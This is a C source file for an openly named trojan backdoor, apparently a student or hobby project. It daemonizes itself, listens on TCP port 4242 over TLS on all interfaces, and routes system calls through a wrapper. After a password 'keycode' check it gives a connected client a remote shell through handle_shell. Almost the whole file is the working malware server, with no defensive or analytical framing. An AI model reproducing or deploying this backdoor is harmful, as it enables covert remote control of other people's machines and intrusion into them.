#include "trojan.h"

int active_connections = 0;
int sig;

void sig_handler(int signal) {
    sig = signal;
}

int handle_recv(SSL *ssl) {
    char buffer[1024];
    char response[1024];


    while (1) {
        SSL_write(ssl, "$> ", 3);
        memset(buffer, 0, 1024);
        memset(response, 0, 1024);
        size_t valread;
        if (!SSL_read_ex(ssl, buffer, sizeof(buffer) - 1, &valread) || valread <= 0)
            break;
        buffer[valread] = '\0';

        if (!strncmp(buffer, "quit", 4))
            break;
        if (!strncmp(buffer, "shell", 5))
            handle_shell(ssl);
        snprintf(response, 1024, "%s", "Command not found\n\n");
        SSL_write(ssl, response, strlen(response));
    }

    return 1;
}

void *handle_client(void *arg) {
    t_args *args;

    args = (t_args *)arg;

    char response[1024];
    char buffer[1024];
    int ssl_read_err;

    while (1) {
        memset(buffer, 0, 1024);
        memset(response, 0, 1024);
        snprintf(response, 1024, "%s", "Enter the keycode:  ");
        SSL_write(args->ssl, response, strlen(response));
        size_t valread;

        int ret_code = SSL_read_ex(args->ssl, buffer, sizeof(buffer) - 1, &valread);

        buffer[valread] = '\0';
       // printf("val read : %ld sig :%d : %s : ret error : %d\n", valread, sig, buffer, ret);
        if (ret_code == 0) {
            ssl_read_err = SSL_get_error(args->ssl, ret_code);
            break ;
        }
        if (sig == SIGPIPE || valread <= 0)
            break;

        if (check_pwd((unsigned char *)buffer, valread - 1)) {
            snprintf(response, 1024, "%s", "Connection established, welcome\n\n");
            SSL_write(args->ssl, response, strlen(response));
            if (handle_recv(args->ssl))
                break;
        } else {
            snprintf(response, 1024, "%s", "Connection failed\n\n");
            SSL_write(args->ssl, response, strlen(response));
        }
    }

    printf("close connexion\n");
    if (ssl_read_err != SSL_ERROR_SSL || ssl_read_err != SSL_ERROR_SYSCALL)
        SSL_shutdown(args->ssl);
    SSL_free(args->ssl);
    sc(SYS_close, args->client_socket);
    free(args);
    active_connections--;

    return NULL;
}

void start_socket_listener() {
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;
    SSL_CTX *ctx = create_context();
    configure_cert(ctx);

    server_fd = sc(SYS_socket, AF_INET, SOCK_STREAM, 0);
    sc(SYS_setsockopt, server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(4242);

    sc(SYS_bind, server_fd, (struct sockaddr *)&address, sizeof(address));
    sc(SYS_listen, server_fd, MAX_CLIENTS);

    printf("Server listening on port 4242\n");
    while (1) {
        t_args *args = calloc(1, sizeof(t_args));
        args->ssl = SSL_new(ctx);
        socklen_t addrlen = sizeof(address);
        args->client_socket = sc(SYS_accept ,server_fd, (struct sockaddr *)&address, &addrlen);
        SSL_set_fd(args->ssl, args->client_socket);

        printf("New connection attempt...\n");
        if (SSL_accept(args->ssl)) {
            if (active_connections >= MAX_CLIENTS) {
                SSL_write(args->ssl, "Connection refused\n", strlen("Connection refused\n"));
                ft_shutdown(args);
                continue;
            }
            active_connections++;
            pthread_t thread_id;
            
            pthread_create(&thread_id, NULL, handle_client, args);
            pthread_detach(thread_id);
        } else {
            ERR_print_errors_fp(stderr);
            ft_shutdown(args);
        }
    }
    handle_lock(UNLOCK);
    sc(SYS_close, server_fd);
    SSL_CTX_free(ctx);
}

int main(int ac, char **av) {
    (void)ac;
    (void)av;
    create_daemon();
    signal(SIGPIPE, sig_handler);
    start_socket_listener();
    return 0;
}
